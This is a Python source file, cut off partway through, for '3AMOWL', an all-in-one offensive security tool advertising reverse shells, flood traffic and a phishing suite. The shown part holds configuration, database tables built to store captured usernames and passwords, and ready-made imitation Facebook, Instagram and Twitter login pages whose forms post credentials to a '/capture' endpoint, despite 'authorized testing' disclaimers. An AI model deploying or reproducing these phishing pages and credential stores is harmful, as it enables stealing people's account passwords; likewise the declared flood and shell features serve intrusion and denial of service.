#!/usr/bin/env python3
"""
🦉 3AMOWL 
Author: Ian Carter Kulani
Version: 1.0.0
License: Educational Purpose Only

A comprehensive cybersecurity tool with:
- 🕷️ Shodan Internet Device Search
- 📡 Netcat Command Execution (Bind/Reverse Shells, File Transfer, Port Scanning)
- 🔌 SSH Remote Command Execution
- ⏰ Time/Date Commands with History
- 🚀 REAL Traffic Generation (ICMP, TCP, UDP, HTTP, DNS, ARP)
- 🎣 Social Engineering Suite with Phishing Capabilities
- 📱 Multi-Platform Integration (Discord, Telegram, WhatsApp, Slack, Signal, iMessage)
- 🔒 IP Management, Threat Detection, and Reporting
- 🕷️ Nikto Web Vulnerability Scanner
- 📊 Session Management & Routing
- 💾 Workspace Organization
- 🎨 Neon Blue/Purple/Orange Theme Interface

⚠️ FOR AUTHORIZED SECURITY TESTING ONLY
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from concurrent.futures import ThreadPoolExecutor
from cryptography.fernet import Fernet
from http.server import BaseHTTPRequestHandler, HTTPServer

# =====================
# SHODAN INTEGRATION
# =====================
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False
    print("⚠️ Shodan not available. Install with: pip install shodan")

# =====================
# SSH INTEGRATION
# =====================
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("⚠️ Paramiko not available. Install with: pip install paramiko")

# =====================
# PLATFORM IMPORTS
# =====================

# Discord
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
    print("⚠️ Discord.py not available. Install with: pip install discord.py")

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("⚠️ Telethon not available. Install with: pip install telethon")

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False
    print("⚠️ Selenium not available. Install with: pip install selenium webdriver-manager")

# Slack
try:
    from slack_sdk import WebClient
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False
    print("⚠️ Slack SDK not available. Install with: pip install slack-sdk")

# Signal
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None
if not SIGNAL_CLI_AVAILABLE:
    print("⚠️ signal-cli not found. Signal integration will be disabled")

# iMessage (macOS only)
IMESSAGE_AVAILABLE = platform.system().lower() == 'darwin' and shutil.which('osascript') is not None
if not IMESSAGE_AVAILABLE:
    print("⚠️ iMessage integration only available on macOS")

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP
    from scapy.all import send, sr1, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️ Scapy not available. Install with: pip install scapy")

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False
    print("⚠️ Python-whois not available. Install with: pip install python-whois")

# QR Code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False
    print("⚠️ qrcode not available. Install with: pip install qrcode[pil]")

# URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False
    print("⚠️ pyshorteners not available. Install with: pip install pyshorteners")

# Colorama for theme colors
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    print("⚠️ Colorama not available. Install with: pip install colorama")

# =====================
# NEON THEME COLORS (Blue/Purple/Orange)
# =====================
if COLORAMA_AVAILABLE:
    class Colors:
        # Blue theme
        PRIMARY = Fore.BLUE + Style.BRIGHT
        SECONDARY = Fore.CYAN + Style.BRIGHT
        ACCENT = Fore.LIGHTBLUE_EX + Style.BRIGHT
        
        # Orange theme
        ORANGE = Fore.YELLOW + Style.BRIGHT
        ORANGE1 = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        ORANGE2 = Fore.YELLOW
        
        # Purple theme
        PURPLE = Fore.MAGENTA + Style.BRIGHT
        PURPLE1 = Fore.MAGENTA
        PURPLE2 = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
        
        SUCCESS = Fore.GREEN + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        INFO = Fore.MAGENTA + Style.BRIGHT
        
        DARK_BLUE = Fore.BLUE
        LIGHT_BLUE = Fore.LIGHTBLUE_EX
        RESET = Style.RESET_ALL
        
        BG_BLUE = Back.BLUE + Fore.WHITE
        BG_ORANGE = Back.YELLOW + Fore.BLACK
        BG_PURPLE = Back.MAGENTA + Fore.WHITE
else:
    class Colors:
        PRIMARY = SECONDARY = ACCENT = ORANGE = ORANGE1 = ORANGE2 = PURPLE = PURPLE1 = PURPLE2 = SUCCESS = WARNING = ERROR = INFO = DARK_BLUE = LIGHT_BLUE = BG_BLUE = BG_ORANGE = BG_PURPLE = RESET = ""

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".3amowl"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
SHODAN_CONFIG_FILE = os.path.join(CONFIG_DIR, "shodan_config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SIGNAL_CONFIG_FILE = os.path.join(CONFIG_DIR, "signal_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
IMESSAGE_CONFIG_FILE = os.path.join(CONFIG_DIR, "imessage_config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "3amowl_data.db")
LOG_FILE = os.path.join(CONFIG_DIR, "3amowl.log")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
SESSION_DATA_DIR = os.path.join(CONFIG_DIR, "sessions")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")
SHODAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "shodan_results")
REPORT_DIR = "reports"
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "captured_credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
TIME_HISTORY_DIR = os.path.join(CONFIG_DIR, "time_history")
NETCAT_LISTENERS_DIR = os.path.join(CONFIG_DIR, "netcat_listeners")
TEMP_DIR = "temp"

# Create directories
directories = [
    CONFIG_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, 
    SESSION_DATA_DIR, NIKTO_RESULTS_DIR, WHATSAPP_SESSION_DIR,
    PHISHING_DIR, REPORT_DIR, TRAFFIC_LOGS_DIR, PHISHING_TEMPLATES_DIR,
    PHISHING_LOGS_DIR, CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR,
    SSH_LOGS_DIR, TIME_HISTORY_DIR, SHODAN_RESULTS_DIR,
    NETCAT_LISTENERS_DIR, TEMP_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("3AMOWL")

# =====================
# DATA CLASSES & ENUMS
# =====================

class ScanType:
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    VULNERABILITY = "vulnerability"
    FULL = "full"
    UDP = "udp"
    OS_DETECTION = "os_detection"
    SERVICE_DETECTION = "service_detection"
    WEB = "web"
    NIKTO = "nikto"

class TrafficType:
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    MIXED = "mixed"
    RANDOM = "random"

class NetcatMode:
    LISTEN = "listen"
    CONNECT = "connect"
    SCAN = "scan"
    TRANSFER = "transfer"
    BIND_SHELL = "bind_shell"
    REVERSE_SHELL = "reverse_shell"
    PROXY = "proxy"
    RELAY = "relay"

class Severity:
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class PhishingPlatform:
    FACEBOOK = "facebook"
    INSTAGRAM = "instagram"
    TWITTER = "twitter"
    LINKEDIN = "linkedin"
    GMAIL = "gmail"
    CUSTOM = "custom"

@dataclass
class NetcatListener:
    id: str
    port: int
    mode: str
    start_time: str
    status: str
    connections: int = 0
    data_received: int = 0
    pid: Optional[int] = None

@dataclass
class ShodanResult:
    query: str
    timestamp: str
    total_results: int
    results: List[Dict]
    facets: Optional[Dict] = None
    saved_file: Optional[str] = None
    error: Optional[str] = None

@dataclass
class SSHServer:
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    created_at: str = None
    last_used: Optional[str] = None
    status: str = "disconnected"
    notes: str = ""

@dataclass
class SSHCommandResult:
    success: bool
    output: str
    error: Optional[str] = None
    execution_time: float = 0.0
    server: str = ""
    command: str = ""

@dataclass
class TrafficGenerator:
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"
    error: Optional[str] = None

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class ScanResult:
    target: str
    scan_type: str
    open_ports: List[Dict]
    timestamp: str
    success: bool
    error: Optional[str] = None
    vulnerabilities: Optional[List[Dict]] = None

@dataclass
class NiktoResult:
    target: str
    timestamp: str
    vulnerabilities: List[Dict]
    scan_time: float
    output_file: str
    success: bool
    error: Optional[str] = None

@dataclass
class PhishingLink:
    id: str
    platform: str
    original_url: str
    phishing_url: str
    template: str
    created_at: str
    clicks: int = 0
    captured_credentials: List[Dict] = None

@dataclass
class CommandResult:
    success: bool
    output: str
    execution_time: float
    error: Optional[str] = None
    data: Optional[Dict] = None

# =====================
# CONFIGURATION MANAGER
# =====================
class ConfigManager:
    """Configuration manager with encryption for sensitive data"""
    
    DEFAULT_CONFIG = {
        "monitoring": {
            "enabled": True,
            "port_scan_threshold": 10,
            "syn_flood_threshold": 100,
            "udp_flood_threshold": 500,
            "http_flood_threshold": 200,
            "ddos_threshold": 1000
        },
        "scanning": {
            "default_ports": "1-1000",
            "timeout": 30,
            "rate_limit": False
        },
        "security": {
            "auto_block": False,
            "auto_block_threshold": 5,
            "log_level": "INFO",
            "backup_enabled": True,
            "encrypt_passwords": True
        },
        "shodan": {
            "enabled": False,
            "api_key": "",
            "max_results": 100,
            "save_results": True,
            "auto_query": False
        },
        "netcat": {
            "enabled": True,
            "default_port": 4444,
            "timeout": 30,
            "max_listeners": 10,
            "allowed_ips": [],
            "log_traffic": True
        },
        "nikto": {
            "enabled": True,
            "timeout": 300,
            "max_targets": 10,
            "scan_level": 2,
            "ssl_ports": "443,8443,9443",
            "db_check": True
        },
        "traffic_generation": {
            "enabled": True,
            "max_duration": 300,
            "max_packet_rate": 1000,
            "require_confirmation": True,
            "log_traffic": True,
            "allow_floods": False
        },
        "social_engineering": {
            "enabled": True,
            "default_domain": "localhost",
            "default_port": 8080,
            "use_https": False,
            "capture_credentials": True,
            "log_all_requests": True,
            "auto_shorten_urls": True
        },
        "ssh": {
            "enabled": True,
            "default_timeout": 30,
            "max_connections": 5,
            "keep_alive": 60,
            "log_commands": True,
            "allow_command_execution": True
        },
        "discord": {
            "enabled": False,
            "token": "",
            "channel_id": "",
            "prefix": "!",
            "admin_role": "Admin",
            "security_role": "Security Team"
        },
        "telegram": {
            "enabled": False,
            "api_id": "",
            "api_hash": "",
            "bot_token": "",
            "phone_number": "",
            "channel_id": ""
        },
        "whatsapp": {
            "enabled": False,
            "phone_number": "",
            "command_prefix": "/",
            "auto_login": False,
            "session_timeout": 3600,
            "allowed_contacts": []
        },
        "signal": {
            "enabled": False,
            "phone_number": "",
            "command_prefix": "!",
            "signal_cli_path": "signal-cli",
            "allowed_numbers": []
        },
        "slack": {
            "enabled": False,
            "bot_token": "",
            "app_token": "",
            "channel_id": "",
            "command_prefix": "!",
            "allowed_users": []
        },
        "imessage": {
            "enabled": False,
            "phone_numbers": [],
            "command_prefix": "!",
            "allowed_numbers": []
        }
    }
    
    @staticmethod
    def get_encryption_key() -> bytes:
        """Get or create encryption key"""
        key_file = os.path.join(CONFIG_DIR, ".key")
        
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            return key
    
    @staticmethod
    def encrypt_data(data: str) -> str:
        """Encrypt sensitive data"""
        try:
            key = ConfigManager.get_encryption_key()
            f = Fernet(key)
            return f.encrypt(data.encode()).decode()
        except:
            return data
    
    @staticmethod
    def decrypt_data(data: str) -> str:
        """Decrypt sensitive data"""
        try:
            key = ConfigManager.get_encryption_key()
            f = Fernet(key)
            return f.decrypt(data.encode()).decode()
        except:
            return data
    
    @staticmethod
    def load_config() -> Dict:
        """Load configuration"""
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    # Merge with defaults
                    for key, value in ConfigManager.DEFAULT_CONFIG.items():
                        if key not in config:
                            config[key] = value
                        elif isinstance(value, dict):
                            for sub_key, sub_value in value.items():
                                if sub_key not in config[key]:
                                    config[key][sub_key] = sub_value
                    return config
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
        
        return ConfigManager.DEFAULT_CONFIG.copy()
    
    @staticmethod
    def save_config(config: Dict) -> bool:
        """Save configuration"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logger.info("Configuration saved")
            return True
        except Exception as e:
            logger.error(f"Failed to save config: {e}")
            return False
    
    @staticmethod
    def load_shodan_config() -> Dict:
        """Load Shodan configuration"""
        try:
            if os.path.exists(SHODAN_CONFIG_FILE):
                with open(SHODAN_CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    if config.get('api_key', '').startswith('enc:'):
                        config['api_key'] = ConfigManager.decrypt_data(config['api_key'][4:])
                    return config
        except Exception as e:
            logger.error(f"Failed to load Shodan config: {e}")
        return {"api_key": "", "enabled": False}
    
    @staticmethod
    def save_shodan_config(api_key: str, enabled: bool = True, encrypt: bool = True) -> bool:
        """Save Shodan configuration"""
        try:
            config = {"api_key": api_key, "enabled": enabled}
            if encrypt and api_key:
                config['api_key'] = 'enc:' + ConfigManager.encrypt_data(api_key)
            with open(SHODAN_CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Failed to save Shodan config: {e}")
            return False

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager with session and workspace tracking"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS workspaces (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS time_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                user TEXT,
                result TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS shodan_queries (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                query TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                total_results INTEGER,
                output_file TEXT,
                facets TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS shodan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                query_id INTEGER,
                ip TEXT,
                port INTEGER,
                org TEXT,
                isp TEXT,
                country TEXT,
                city TEXT,
                hostnames TEXT,
                os TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (query_id) REFERENCES shodan_queries(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS netcat_listeners (
                id TEXT PRIMARY KEY,
                port INTEGER NOT NULL,
                mode TEXT NOT NULL,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'running',
                connections INTEGER DEFAULT 0,
                data_received INTEGER DEFAULT 0,
                pid INTEGER,
                end_time TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS netcat_connections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                listener_id TEXT,
                remote_ip TEXT,
                remote_port INTEGER,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data_size INTEGER,
                command TEXT,
                FOREIGN KEY (listener_id) REFERENCES netcat_listeners(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                server_name TEXT,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                error TEXT,
                execution_time REAL,
                executed_by TEXT,
                FOREIGN KEY (server_id) REFERENCES ssh_servers(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                server_id TEXT NOT NULL,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                end_time TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                status TEXT DEFAULT 'active',
                FOREIGN KEY (server_id) REFERENCES ssh_servers(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT,
                error TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                original_url TEXT,
                phishing_url TEXT NOT NULL,
                template TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                threat_level INTEGER DEFAULT 0,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS user_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                user_name TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_activity TIMESTAMP,
                commands_count INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT,
                error TEXT
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self.create_default_workspace()
        self._init_phishing_templates()
    
    def create_default_workspace(self):
        """Create default workspace"""
        try:
            self.cursor.execute('''
                INSERT OR IGNORE INTO workspaces (name, description, active)
                VALUES ('default', 'Default workspace', 1)
            ''')
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to create default workspace: {e}")
    
    def _init_phishing_templates(self):
        """Initialize default phishing templates"""
        templates = {
            "facebook_default": {"platform": "facebook", "html": self._get_facebook_template()},
            "instagram_default": {"platform": "instagram", "html": self._get_instagram_template()},
            "twitter_default": {"platform": "twitter", "html": self._get_twitter_template()},
            "gmail_default": {"platform": "gmail", "html": self._get_gmail_template()},
            "linkedin_default": {"platform": "linkedin", "html": self._get_linkedin_template()}
        }
        
        for name, template in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates (name, platform, html_content)
                    VALUES (?, ?, ?)
                ''', (name, template['platform'], template['html']))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #1877f2; font-size: 40px; margin: 0; }
        .form-group { margin-bottom: 15px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        button { width: 100%; padding: 14px 16px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .forgot-password { text-align: center; margin-top: 16px; }
        .signup-link { text-align: center; margin-top: 20px; border-top: 1px solid #dadde1; padding-top: 20px; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>facebook</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="forgot-password"><a href="#">Forgotten account?</a></div>
            </form>
            <div class="signup-link"><a href="#">Create new account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background-color: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 350px; width: 100%; padding: 20px; }
        .login-box { background-color: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 30px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-family: 'Billabong', cursive; font-size: 50px; margin: 0; color: #262626; }
        .form-group { margin-bottom: 10px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 9px 8px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
        button { width: 100%; padding: 7px 16px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 8px; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .divider-line { flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider-text { margin: 0 18px; color: #8e8e8e; font-weight: 600; font-size: 13px; }
        .forgot-password { text-align: center; margin-top: 12px; }
        .signup-box { background-color: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; margin-top: 10px; text-align: center; }
        .warning { margin-top: 20px; padding: 10px; background-color: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Instagram</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
        </div>
        <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
        <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
    </div>
</body>
</html>"""
    
    def _get_twitter_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>X / Twitter</title>
    <style>
        body { font-family: 'TwitterChirp', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #000000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #e7e9ea; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .login-box { background-color: #000000; border: 1px solid #2f3336; border-radius: 16px; padding: 48px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 40px; margin: 0; color: #e7e9ea; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background-color: #000000; border: 1px solid #2f3336; border-radius: 4px; color: #e7e9ea; font-size: 16px; box-sizing: border-box; }
